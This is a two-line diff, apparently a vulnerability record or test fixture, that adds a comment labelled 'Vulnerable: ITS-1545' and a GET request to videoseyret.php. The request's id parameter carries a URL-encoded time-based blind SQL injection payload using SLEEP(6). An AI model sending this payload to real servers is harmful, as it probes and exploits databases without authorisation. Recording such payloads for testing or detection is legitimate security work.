@@ -1,0 +1,2 @@
+# Vulnerable: ITS-1545
+GET /videoseyret.php?id=95%20AND%20(SELECT%204581%20FROM%20(SELECT(SLEEP(6)))NyiX)
